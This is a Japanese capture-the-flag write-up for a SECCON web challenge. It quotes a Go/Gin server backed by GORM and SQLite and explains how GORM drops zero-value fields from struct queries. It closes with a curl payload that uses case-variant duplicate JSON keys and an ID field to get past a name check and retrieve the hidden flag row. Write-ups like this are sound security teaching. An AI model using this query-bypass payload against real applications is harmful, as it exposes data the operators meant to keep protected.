# Vulnerability_writeup
サーバーのコードは以下で与えられている

```package main

import (
	"log"
	"os"

	"github.com/gin-contrib/static"
	"github.com/gin-gonic/gin"
	"github.com/gin-gonic/gin/binding"
	"gorm.io/driver/sqlite"
	"gorm.io/gorm"
)

type Vulnerability struct {
	gorm.Model
	Name string
	Logo string
	URL  string
}

func main() {
	gin.SetMode(gin.ReleaseMode)

	flag := os.Getenv("FLAG")
	if flag == "" {
		flag = "SECCON{dummy_flag}"
	}

	db, err := gorm.Open(sqlite.Open(":memory:"), &gorm.Config{})
	if err != nil {
		log.Fatal("failed to connect database")
	}

	db.AutoMigrate(&Vulnerability{})
	db.Create(&Vulnerability{Name: "Heartbleed", Logo: "/images/heartbleed.png", URL: "https://heartbleed.com/"})
	db.Create(&Vulnerability{Name: "Badlock", Logo: "/images/badlock.png", URL: "http://badlock.org/"})
	db.Create(&Vulnerability{Name: "DROWN Attack", Logo: "/images/drown.png", URL: "https://drownattack.com/"})
	db.Create(&Vulnerability{Name: "CCS Injection", Logo: "/images/ccs.png", URL: "http://ccsinjection.lepidum.co.jp/"})
	db.Create(&Vulnerability{Name: "httpoxy", Logo: "/images/httpoxy.png", URL: "https://httpoxy.org/"})
	db.Create(&Vulnerability{Name: "Meltdown", Logo: "/images/meltdown.png", URL: "https://meltdownattack.com/"})
	db.Create(&Vulnerability{Name: "Spectre", Logo: "/images/spectre.png", URL: "https://meltdownattack.com/"})
	db.Create(&Vulnerability{Name: "Foreshadow", Logo: "/images/foreshadow.png", URL: "https://foreshadowattack.eu/"})
	db.Create(&Vulnerability{Name: "MDS", Logo: "/images/mds.png", URL: "https://mdsattacks.com/"})
	db.Create(&Vulnerability{Name: "ZombieLoad Attack", Logo: "/images/zombieload.png", URL: "https://zombieloadattack.com/"})
	db.Create(&Vulnerability{Name: "RAMBleed", Logo: "/images/rambleed.png", URL: "https://rambleed.com/"})
	db.Create(&Vulnerability{Name: "CacheOut", Logo: "/images/cacheout.png", URL: "https://cacheoutattack.com/"})
	db.Create(&Vulnerability{Name: "SGAxe", Logo: "/images/sgaxe.png", URL: "https://cacheoutattack.com/"})
	db.Create(&Vulnerability{Name: flag, Logo: "/images/" + flag + ".png", URL: "seccon://" + flag})

	r := gin.Default()

	//	Return a list of vulnerability names
	//	{"Vulnerabilities": ["Heartbleed", "Badlock", ...]}
	r.GET("/api/vulnerabilities", func(c *gin.Context) {
		var vulns []Vulnerability
		if err := db.Where("name != ?", flag).Find(&vulns).Error; err != nil {
			c.JSON(400, gin.H{"Error": "DB error"})
			return
		}
		var names []string
		for _, vuln := range vulns {
			names = append(names, vuln.Name)
		}
		c.JSON(200, gin.H{"Vulnerabilities": names})
	})

	//	Return details of the vulnerability
	//	{"Logo": "???.png", "URL": "https://..."}
	r.POST("/api/vulnerability", func(c *gin.Context) {
		//	Validate the parameter
		var json map[string]interface{}
		if err := c.ShouldBindBodyWith(&json, binding.JSON); err != nil {
			c.JSON(400, gin.H{"Error": "JSON error 1"})
			return
		}
		if name, ok := json["Name"]; !ok || name == "" || name == nil {
			c.JSON(400, gin.H{"Error": "no \"Name\""})
			return
		}

		//	Get details of the vulnerability
		var query Vulnerability
		if err := c.ShouldBindBodyWith(&query, binding.JSON); err != nil {
			c.JSON(400, gin.H{"Error": "JSON error 2"})
			return
		}
		var vuln Vulnerability
		if err := db.Where(&query).First(&vuln).Error; err != nil {
			c.JSON(404, gin.H{"Error": "not found"})
			return
		}

		c.JSON(200, gin.H{
			"Logo": vuln.Logo,
			"URL":  vuln.URL,
		})
	})

	r.Use(static.Serve("/", static.LocalFile("static", false)))

	if err := r.Run(":8080"); err != nil {
		log.Fatal(err)
	}
}
 ```

 これはGO言語で記述されており、FLAGはSQLiteのdbの一番後ろに格納されていることが分かる。
 追記
 GO言語とは
 >Google が開発したプログラミング言語です。「Go言語」や「Golang」と表記されます。
UNIX、B言語(C言語の元)、UTF-8の開発者ケン・トンプソンや、UNIX、Plan 9、UTF-8の開発者ロブ・パイクによって設計されました。
静的型付け、メモリ安全性、ガベージコレクションを備えるコンパイル言語です。
シンプル、高速、メモリ効率が良い、メモリ破壊が無い、並行処理が得意などの特徴を備えています。
メモリ破壊が無く、並行処理を得意とする、進化したC言語という側面があります。
Linux、Mac OS X、Windows、Android、iOS で動作します。
https://www.tohoho-web.com/ex/golang.html

SQLiteとは
>SQLiteとは、オープンソースのリレーショナルデータベース管理システム（RDBMS）の一つ。他のソフトウェアに組み込んで利用することを想定した軽量な仕様が特徴。著作権が放棄されたパブリックドメインソフトウェアとして公開されている。
https://e-words.jp/w/SQLite.html
 ``` 	
 db.AutoMigrate(&Vulnerability{})
	db.Create(&Vulnerability{Name: "Heartbleed", Logo: "/images/heartbleed.png", URL: "https://heartbleed.com/"})
	db.Create(&Vulnerability{Name: "Badlock", Logo: "/images/badlock.png", URL: "http://badlock.org/"})
	db.Create(&Vulnerability{Name: "DROWN Attack", Logo: "/images/drown.png", URL: "https://drownattack.com/"})
	db.Create(&Vulnerability{Name: "CCS Injection", Logo: "/images/ccs.png", URL: "http://ccsinjection.lepidum.co.jp/"})
	db.Create(&Vulnerability{Name: "httpoxy", Logo: "/images/httpoxy.png", URL: "https://httpoxy.org/"})
	db.Create(&Vulnerability{Name: "Meltdown", Logo: "/images/meltdown.png", URL: "https://meltdownattack.com/"})
	db.Create(&Vulnerability{Name: "Spectre", Logo: "/images/spectre.png", URL: "https://meltdownattack.com/"})
	db.Create(&Vulnerability{Name: "Foreshadow", Logo: "/images/foreshadow.png", URL: "https://foreshadowattack.eu/"})
	db.Create(&Vulnerability{Name: "MDS", Logo: "/images/mds.png", URL: "https://mdsattacks.com/"})
	db.Create(&Vulnerability{Name: "ZombieLoad Attack", Logo: "/images/zombieload.png", URL: "https://zombieloadattack.com/"})
	db.Create(&Vulnerability{Name: "RAMBleed", Logo: "/images/rambleed.png", URL: "https://rambleed.com/"})
	db.Create(&Vulnerability{Name: "CacheOut", Logo: "/images/cacheout.png", URL: "https://cacheoutattack.com/"})
	db.Create(&Vulnerability{Name: "SGAxe", Logo: "/images/sgaxe.png", URL: "https://cacheoutattack.com/"})
	db.Create(&Vulnerability{Name: flag, Logo: "/images/" + flag + ".png", URL: "seccon://" + flag})
```
またGETで一覧を取得するときFLAGは取得ができないようになっている。
```
	//	Return a list of vulnerability names
	//	{"Vulnerabilities": ["Heartbleed", "Badlock", ...]}
	r.GET("/api/vulnerabilities", func(c *gin.Context) {
		var vulns []Vulnerability
		if err := db.Where("name != ?", flag).Find(&vulns).Error; err != nil {
			c.JSON(400, gin.H{"Error": "DB error"})
			return
		}
		var names []string
		for _, vuln := range vulns {
			names = append(names, vuln.Name)
		}
		c.JSON(200, gin.H{"Vulnerabilities": names})
	})
```
またユーザーからの入力はPOSTで受け付けており、JSON形式で送信しなければならない。
追記
JSONとは「JavaScript Object Notation」の略でデータ記述言語のひとつで土のプログラミング言語でも利用することが可能
人間でも読みやすく、作成も容易かつ軽量
```
//  Return details of the vulnerability
    //  {"Logo": "???.png", "URL": "https://..."}
    r.POST("/api/vulnerability", func(c *gin.Context) {
        //  Validate the parameter
        var json map[string]interface{}
        if err := c.ShouldBindBodyWith(&json, binding.JSON); err != nil {
            c.JSON(400, gin.H{"Error": "JSON error 1"})
            return
        }
        if name, ok := json["Name"]; !ok || name == "" || name == nil {
            c.JSON(400, gin.H{"Error": "no \"Name\""})
            return
        }

        //  Get details of the vulnerability
        var query Vulnerability
        if err := c.ShouldBindBodyWith(&query, binding.JSON); err != nil {
            c.JSON(400, gin.H{"Error": "JSON error 2"})
            return
        }
        var vuln Vulnerability
        if err := db.Where(&query).First(&vuln).Error; err != nil {
            c.JSON(404, gin.H{"Error": "not found"})
            return
        }

        c.JSON(200, gin.H{
            "Logo": vuln.Logo,
            "URL":  vuln.URL,
        })
    })
```

dbへのアクセスにはgormが使われている。これを公式ドキュメントで探すと
https://gorm.io/ja_JP/docs/query.html#%E6%96%87%E5%AD%97%E5%88%97%E6%9D%A1%E4%BB%B6
上のリンクに記述されているdb.Whereが使われている

>注 構造体を使ってクエリを実行するとき、GORMは非ゼロ値なフィールドのみを利用します。つまり、フィールドの値が 0, '', false または他の ゼロ値の場合、 クエリ条件の作成に使用されません。

つまりNameをfalse,nillなどにできればよいがソースコードではNameが空白やnillではerrorになってしまうので考え方を変える。


ソースコードの以下の部分で構造体の形式が分かる。
```
type Vulnerability struct {
	gorm.Model
	Name string
	Logo string
	URL  string
}
```

また公式のリファレンスには以下のような記述がある
```
type User struct {
  gorm.Model
  Name string
}
// equals
type User struct {
  ID        uint           `gorm:"primaryKey"`
  CreatedAt time.Time
  UpdatedAt time.Time
  DeletedAt gorm.DeletedAt `gorm:"index"`
  Name string
}
```

これからgorm.ModelはIDという要素を持っている
この仮定の下以下のコードを入力するとFLAGが出力
```
curl -X POST -d '{"Name": "hoge", "name": "", "ID": 14}' https://vulnerabilities.quals.seccon.jp/api/vulnerability
```
